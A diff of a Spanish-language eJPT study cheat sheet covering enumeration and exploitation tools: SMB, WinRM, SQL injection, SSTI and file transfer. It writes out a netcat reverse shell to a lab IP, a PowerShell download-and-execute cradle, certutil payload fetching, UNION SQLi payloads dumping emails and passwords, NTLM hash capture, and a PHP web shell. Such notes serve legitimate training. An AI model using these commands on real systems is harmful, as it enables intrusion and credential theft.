@@ -1,7 +1,10 @@
 # Herramientas que te pueden servir en el EJPT
 
+## Tabla de Contenido
 
-## 1. Alert
+
+(1.)[Escaneo-de-enumeraicón]
+
 
 ### Escaneo de enumeración de recursos web (HTTP)
 
@@ -195,8 +198,7 @@ Sirve para buscar vulnerabilidades ya documentadas que puedes usar durante un an
 
 **💻 Comando básico:**
 
-```
-bash
+```bash
 searchsploit nombre_del_software
 ``` 
 
@@ -572,6 +574,644 @@ SNMPv2-MIB::sysUpTime.0 = Timeticks: (2311451) 6:25:14.51
 ...
 ``` 
 
+## Curl Command
+
+**1. ¿Qué comando muestra la cabecera HTTP de una página web?**
+
+**curl -i:** este muestra la cabecera HTTP y el cuerpo de la respuesta.
+
+Ejemplo:
+
+
+```bash
+curl -i https://example.com
+``` 
+
+**Si quieres ver solo la cabecera:**
+
+```bash
+curl -I https://example.com
+``` 
+
+
+*(La i minúscula muestra cabezera + contenido, la I mayúscula muestra solo cabecera)*
+
+
+**2. ¿Qué hacen los flags -s y -x en curl?**
+
+`-s` → Silent mode: desactiva la barra de progreso y mensajes de error.
+
+Útil si estás haciendo scripts o quieres una salida limpia.
+
+Ejemplo:
+
+```bash
+curl -s https://example.com
+``` 
+
+- `-x` → Se usa cuando quieres que curl pase por un proxy.
+- `-X` → Define el método HTTP que quieres usar (por defecto curl usa GET).
+
+Ejemplo:
+
+```bash
+# -x
+curl -x http://127.0.0.1:8080 https://example.com
+
+# -X
+curl -X POST https://example.com
+``` 
+
+
+✅ Ejemplo completo:
+
+```bash
+curl -s -i -x http://127.0.0.1:8080 https://example.com
+``` 
+
+- `-s`: modo silencioso
+
+- `-i`: muestra cabeceras + contenido
+
+- `-x`: pasa por proxy
+
+
+###  Conectarte con la clave privada (id_rsa)
+
+Desde otra terminal o tu máquina local, puedes hacer:
+
+```bash
+ssh -i /tmp/clave_rsa usuario@127.0.0.1
+```
+
+**🔐 ¿Por qué ocurre esto?**
+
+Cuando usas `ssh -i id_rsa usuario@host`, SSH verifica los permisos del archivo de clave privada por razones de seguridad.
+
+🔸 Si los permisos son muy abiertos (como 644 o 777), SSH muestra un error como este:
+
+
+```bash
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+```
+
+Y no te deja usar la clave, por lo tanto te pide contraseña como fallback.
+
+
+**✅ ¿Cuál es el permiso correcto?**
+
+```bash
+chmod 600 id_rsa
+```
+
+Esto significa:
+
+- Solo el propietario del archivo puede leer y escribir.
+
+- Nadie más (ni grupo, ni otros) puede acceder.
+
+### Comando básico para conectarse a MySQL
+
+```bash
+mysql -u usuario -p
+
+# Comandos utilizados para navegar en mysql
+
+-> DESC
+-> SHOW
+-> USE
+```
+
+Luego te pedirá la contraseña.
+
+**Si el servidor MySQL está en otro host o en otro puerto:**
+
+```bash
+mysql -h IP_o_HOST -P PUERTO -u usuario -p
+```
+
+- `-h`: host remoto (por defecto localhost)
+
+- `-P`: puerto (por defecto 3306)
+
+- `-u`: usuario
+
+- `-p`: te pedirá la contraseña
+
+
+### Ver que tipo de hash tiene una password (Claro si esta hasheada XD)
+
+```bash
+hashcat --example-hash | grep '$2a$'
+
+# PARAMETROS PARA UTILIZAR
+
+-> -B : Arriba
+-> -A : Abajo
+-> -C : Arriba y abajo
+```
+
+### ¿Qué es IIS?
+
+Es un programa que convierte una **computadora con Windows** en un **servidor web**, capaz de alojar y mostrar páginas o aplicaciones por Internet o Intranet.
+
+
+### ¿Dónde se guardan los archivos subidos por FTP en un servidor Windows con IIS?
+
+Depende de la configuración, pero por defecto:
+
+**IIS (sitio web):**
+
+Los archivos web públicos se guardan aquí:
+
+```cmd
+C:\inetpub\wwwroot\
+```
+
+Este es el root del sitio web, es decir, lo que ves en `http://victima.com/.`
+
+
+### Para entablar la reverse shell en Windows con IIS:
+
+Usé esta ruta para ejecutar Netcat desde la webshell:
+
+```cmd
+C:\inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.6 443
+```
+
+En mi Kali, escuché con:
+
+```bash
+rlwrap nc -nlvp 443
+```
+
+- rlwrap me dio una shell más estable e interactiva.
+
+**Importante: Al subir nc.exe por FTP, primero puse el modo binario con:**
+
+```bash
+# En el FTP
+binary
+```
+
+y luego:
+
+```bash
+put nc.exe
+```
+
+De lo contrario, el archivo se **corrompía** y no funcionaba.
+
+```bash
+# Comandos para interactuar en un entorno Windows
+
+systeminfo
+
+reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
+
+
+# More Information
+
+whoami /groups
+
+whoami /priv
+
+netstat -nat
 
 ```
-``` 
+
+
+### ¿Qué es SMB?
+
+**SMB** (Server Message Block) es un protocolo de red de Windows para compartir archivos, impresoras, y otros recursos entre dispositivos en una red local.
+
+**🧠 En simple:**
+
+SMB es cómo Windows accede a carpetas compartidas como \\servidor\carpeta.
+
+**📘 Comando: Smb Client**
+
+
+```bash
+smbclient -L <IP> -N
+```
+
+**🔍 ¿Qué hace?**
+
+- `-L <IP>`: Lista los recursos compartidos (shares) disponibles en la máquina con esa IP.
+
+- `-N`: No pide contraseña (intenta conectarse como usuario anónimo).
+
+**📘 Comando: Smb Map**
+
+```bash
+smbmap -H 10.10.11.106 -u 'null'
+
+```
+
+**🔍 ¿Qué hace?**
+
+- `-L <IP>`: Lista los recursos compartidos (shares) disponibles en la máquina con esa IP.
+
+- `-N`: No pide contraseña (intenta conectarse como usuario anónimo).
+
+**🧠 ¿Para qué sirven?**
+
+👉 Enumerar comparticiones SMB disponibles (shares) y ver qué permisos tienes como ese usuario.
+
+### Puertos comunes en entornos Windows
+
+| Puerto   | Protocolo | Servicio                          | ¿Para qué sirve?                                                 |
+| -------- | --------- | --------------------------------- | ---------------------------------------------------------------- |
+| **135**  | TCP       | **RPC (Remote Procedure Call)**   | Comunicación entre servicios remotos (inicio de DCOM, WMI, etc.) |
+| **139**  | TCP       | **NetBIOS Session Service**       | SMB sobre NetBIOS (antiguo, usado en Windows viejos)             |
+| **445**  | TCP       | **SMB (Server Message Block)**    | Compartición de archivos, impresoras, autenticación NTLM         |
+| **3389** | TCP       | **RDP (Remote Desktop Protocol)** | Escritorio remoto                                                |
+| **5985** | TCP       | **WinRM (HTTP)**                  | Administración remota con PowerShell (sin cifrado)               |
+| **5986** | TCP       | **WinRM (HTTPS)**                 | Igual que 5985 pero cifrado (TLS)                                |
+| **88**   | TCP/UDP   | **Kerberos**                      | Autenticación en Active Directory                                |
+| **389**  | TCP/UDP   | **LDAP**                          | Directorio de usuarios y equipos                                 |
+| **636**  | TCP       | **LDAPS**                         | LDAP cifrado con SSL/TLS                                         |
+| **53**   | TCP/UDP   | **DNS**                           | Resolución de nombres                                            |
+| **464**  | TCP/UDP   | **Kerberos (kpasswd)**            | Cambios de contraseña en AD                                      |
+
+**🧠 ¿Por qué te importa esto como pentester?**
+
+- 445 → Para ataques SMB (enumeración, credenciales, lateral movement).
+
+- 135 + 445 → Uso combinado en ataques DCOM, WMI, o psexec.
+
+- 5985/5986 → Si están abiertos y autenticables, puedes usar Evil-WinRM.
+
+- 3389 → Ataques RDP (brute force, screen hijack si tienes creds).
+
+- 389/636/88 → Clave para ataques a Active Directory.
+
+## Impacket-smbserver
+
+Levanta un servidor SMB falso en tu máquina para que otras máquinas (víctimas) se conecten.
+
+**🧠 ¿Para qué sirve?**
+
+- Robar hashes NTLMv2 (cuando alguien accede a \\tu-ip\share).
+
+- Transferir archivos fácilmente desde/hacia máquinas Windows.
+
+- Exploits que necesitan una ruta UNC (como \\IP\share\payload.dll).
+
+**💻 Ejemplo de uso:**
+
+```bash
+smbserver.py share_name /ruta/al/directorio
+# $(pwd)
+```
+
+Ejemplo real:
+
+```bash
+smbserver.py files $(pwd)
+```
+
+Luego en la víctima:
+
+```bash
+copy \\<tu-ip>\files\payload.exe .
+```
+
+**⚠️ Pentesting puro****
+
+Es clave en escenarios como: captura de hashes, bypass de UAC, DLL hijacking, remote load, etc.
+
+
+
+**🔹 1.**
+
+```bash
+nxc smb 10.10.11.106 -u 'tony' -p 'liltony'
+```
+
+**✅ ¿Qué hace?**
+
+Usa nxc (alias de crackmapexec) para probar si las credeciales funcionan en el servicio SMB del host.
+
+**🔍 ¿Para qué sirve?**
+
+- Ver si el usuario tony tiene acceso SMB.
+- Enumerar permisos.
+- Ver si puedes moverte lateralmente.
+
+**🔹 2.** 
+
+```bash
+nxc winrm 10.10.11.106 -u 'tony' -p 'liltony'
+```
+
+**✅ ¿Qué hace?**
+
+Prueba si tony:liltony tiene acceso a WinRM (puerto 5985 o 5986) en ese host.
+
+**🔍 ¿Para qué sirve?**
+
+- Confirmar si puedes hacer ejecución remota de comandos vía PowerShell Remoting.
+- Paso previo a usar Evil-WinRM.
+
+**🔹 3.** 
+
+```bash
+evil-winrm -i 10.10.11.106 -u tony -p liltony
+```
+
+**✅ ¿Qué hace?**
+
+Inicia una shell remota interactiva en PowerShell usando WinRM, si las credenciales son válidas.
+
+**🔍 ¿Para qué sirve?**
+
+- Tener acceso remoto completo tipo PowerShell a una máquina Windows.
+
+- Ejecutar comandos, cargar archivos, post-explotación, etc.
+
+**🔹 3.** 
+
+```bash
+evil-winr
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/script.ps1')
+```
+
+**🧠 ¿Qué hace?**
+
+- New-Object Net.WebClient: crea un cliente HTTP.
+
+- .DownloadString(...): descarga el contenido del script remoto (texto).
+
+IEX (Invoke-Expression): ejecuta el contenido del script descargado como código PowerShell.
+
+💥 Efecto: Ejecuta un script remoto desde tu servidor (en 10.10.14.28), como si lo hubieras escrito a mano en la consola.
+
+### SQLi
+
+**🔹 1. Confirmar vulnerabilidad**
+
+```sql
+' OR 1=1-- 
+' OR '1'='1'--
+```
+
+Sirve para verificar que el campo es vulnerable a inyección.
+
+**🔹 2. Confirmar motor y usuario**
+
+```sql
+' UNION SELECT @@version, NULL--         -- (MySQL)
+' UNION SELECT user(), NULL--            -- 
+(Usuario actual)
+```
+
+Te ayuda a saber qué motor y usuario de base de datos estás usando.
+
+**🔹 3. Identificar la base de datos actual**
+
+```sql
+' UNION SELECT database(), NULL--
+```
+
+Descubres en qué base de datos estás trabajando (por ejemplo: main).
+
+**🔹 4. Listar todas las bases de datos (opcional)**
+
+```sql
+' UNION SELECT schema_name, NULL FROM 
+information_schema.schemata--
+```
+
+Puedes ver si hay otras bases de datos que podrían ser útiles.
+
+**🔹 5. Listar tablas de la base actual**
+
+```sql
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='main'--
+```
+
+Descubres todas las tablas dentro de la base de datos actual (main).
+
+**🔹 6. Listar columnas de una tabla específica**
+
+```sql
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+```
+
+Identificas qué columnas tiene la tabla objetivo (users).
+
+**🔹 7. Extraer información de múltiples columnas (usando CONCAT)**
+
+```sql
+' UNION SELECT CONCAT(email, ':', password, ':', name) FROM users--
+```
+
+Extraes datos de varias columnas aun cuando solo se puede mostrar un campo.
+
+**🔹 8. Paginar resultados si solo ves una fila**
+
+```sql
+' UNION SELECT CONCAT(email, ':', password) FROM users LIMIT 1 OFFSET 0--
+
+' UNION SELECT CONCAT(email, ':', password) FROM users LIMIT 1 OFFSET 1--
+```
+
+Para ver registros uno por uno si el output está limitado.
+
+### Contar caracteres de una hash
+
+```bash
+echo -n '098f6bcd4621d373cade4e832627b4f6' | wc -c
+```
+
+-  `-n` -> No toma los saltos de línea.
+
+
+### SSTI - Server-Side Template Injection
+
+**🔍 ¿Qué es?**
+
+Una SSTI ocurre cuando una aplicación web inyecta directamente entradas del usuario en una plantilla del lado del servidor (server-side template) sin sanitizarla correctamente. Esto permite ejecutar código arbitrario dentro del motor de plantillas.
+
+**🧪 Ejemplo típico de prueba:**
+
+```html
+{{7*7}}
+```
+
+- Si ves en la respuesta algo como 49, es vulnerable a SSTI.
+
+- Es una forma común de testear motores como Jinja2 (usado en Python/Flask), Twig (PHP), etc.
+
+**🔥 ¿Qué puede provocar?**
+
+- Ejecución remota de código (RCE)
+- Acceso a variables del sistema
+- Lectura de archivos sensibles (/etc/passwd)
+- Acceso a entorno (os, config, etc.)
+
+**🧠 Motores vulnerables comunes**
+
+| Lenguaje | Motor de plantilla              |
+| -------- | ------------------------------- |
+| Python   | Jinja2, Mako                    |
+| Ruby     | ERB                             |
+| Java     | FreeMarker, Velocity            |
+| PHP      | Twig, Smarty                    |
+| Node.js  | EJS, Handlebars (con variantes) |
+
+
+
+### Recibir peticiones de Machines Victimas
+
+**Con un ping**
+
+```bash
+sudo tcpdump -i eth0 icmp
+```
+
+```bash
+ping <IP_de_tu_Kali>
+```
+
+**Con una petición por netcat**
+
+```bash
+# En Kali (escuchar)
+nc -lvnp 4444
+```
+
+```bash
+# En víctima (conectar)
+nc <IP_KALI> 4444
+```
+
+### Buscas profundas
+
+**1️⃣ Buscar dentro de contenido de archivos (recursivo)**
+
+Si quieres buscar un patrón en todo el contenido de los archivos desde el directorio actual:
+
+```bash
+grep -i -r "patron" .
+```
+
+- `-i` → ignore case (mayúsc/minúsc no importa)
+- `-r` → recursivo, entra en subdirectorios
+- `"patron"` → lo que buscas (puede ser texto, parte de contraseña, etc.)
+- `.` → directorio actual
+
+**💡 Ejemplo:**
+
+```bash
+grep -i -r "password" .
+```
+
+Busca la palabra "password" en todos los archivos del directorio y subdirectorios.
+
+**2️⃣ Buscar por nombre de archivo (sin leer el contenido)**
+
+Aquí ya no usas grep sobre el contenido, sino sobre el listado de archivos con find + grep:
+
+```bash
+find . -type f | grep -i "nombre"
+```
+
+- `find . -type f` → lista todos los archivos
+- `grep -i "nombre"` → filtra por nombre que contenga la palabra
+
+**💡 Ejemplo:**
+
+```bash
+find . -type f | grep -i "config"
+```
+
+Muestra todos los archivos cuyo nombre contenga "config".
+
+**3️⃣ Extra: buscar patrón solo en ciertos tipos de archivo**
+
+```bash
+grep -i --include="*.txt" -r "patron" .
+```
+
+Solo busca dentro de archivos .txt.
+
+### Traer un archivo de la máquina remota a la local con nc
+
+En tu máquina local (recibir el archivo)
+
+**1. Abre un puerto para escuchar y guardar lo que llegue:**
+
+```bash
+nc -lvnp 4444 > archivo_recibido.txt
+```
+
+- Cambia 4444 por cualquier puerto libre y archivo_recibido.txt por el nombre que quieras.
+
+**2. En la máquina remota (enviar el archivo)**
+
+Ejecuta:
+
+```bash
+nc TU_IP_LOCAL 4444 < /ruta/del/archivo.txt
+```
+
+- TU_IP_LOCAL = la IP de tu máquina que escucha.
+Deben estar en la misma red o con puertos abiertos.
+
+**💡 Notas importantes:**
+
+- nc no cifra nada → si es sensible, usa una VPN o túnel.
+- En algunos sistemas el binario se llama ncat o netcat.
+- Si hay firewalls, debes abrir el puerto elegido.
+- El flujo es unidireccional: si quieres devolver algo, repites pero invirtiendo roles.
+
+### Comando para traerse cosas a una CMD
+
+Si en la máquina Linux víctima ya levantaste el servidor con:
+
+```bash
+python3 -m http.server 80
+```
+
+y el .exe está en ese directorio, desde la máquina Windows (con CMD) puedes traértelo con certutil (el comando que empieza con c que recuerdas 😁).
+
+**Ejemplo:**
+
+```bash
+certutil -urlcache -f http://<IP_LINUX>/<archivo>.exe C:\Users\Public\<archivo>.exe
+```
+
+**🔹 Explicación:**
+
+- `<IP_LINUX>` → la IP de la máquina donde levantaste el `http.server` (ej. `10.10.14.14`).
+- `<archivo>.exe` → el nombre del ejecutable que quieres bajar.
+- `C:\Users\Public\` → ruta donde lo guardarás en Windows.
+
+### Escalada de Privilegios en Windows
+
+1. 
+
+![Logo de Kali](https://prnt.sc/rD-dujOAAWhf)
+
+### Remote Code Execution (RCE) vía parámetros en PHP,
+
+```php
+<?php
+if (isset($_GET['content'])) {
+    $cmd = $_GET['content'];   // ← Toma lo que pongas en la URL
+    system($cmd);              // ← Lo ejecuta en el sistema
+}
+?>
+```
+
+Si visitas:
+
+```
+http://servidor/exec.php?content=whoami
+```
+
+El script ejecutará whoami en el servidor y mostrará el resultado.
